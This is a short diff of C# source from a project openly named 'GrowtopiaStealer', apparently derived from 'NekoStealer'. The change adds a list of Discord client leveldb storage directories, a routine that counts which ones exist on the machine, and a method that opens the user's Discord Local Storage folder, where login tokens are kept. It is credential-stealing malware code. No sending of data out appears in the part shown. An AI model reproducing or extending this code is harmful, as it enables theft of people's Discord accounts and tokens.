@@ -2,14 +2,33 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
-using System.Text;
 using System.Text.RegularExpressions;
-using System.Threading.Tasks;
 
 namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer that code from https://github.com/TheC0mpany/NekoStealer
 {
     class Discord
     {
+        public static string[] DiscordDirectories = new string[] {
+            "Discord\\Local Storage\\leveldb",
+            "Discord PTB\\Local Storage\\leveldb",
+            "Discord Canary\\leveldb",
+            };
+
+        public static void DiscordExistsOrNo()
+        {
+            foreach (string dir in DiscordDirectories)
+            {
+                string directory = Path.GetDirectoryName(Path.Combine(Paths.appdata, dir));                
+                if (!Directory.Exists(directory))
+                    return;
+                try
+                {
+                    Counting.Discord++;
+                }
+                catch { }
+            }
+        }
+
         public static List<string> Get(string toPath)
         {
             DirectoryInfo path = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\" + toPath + @"\Local Storage\leveldb"); //Folder
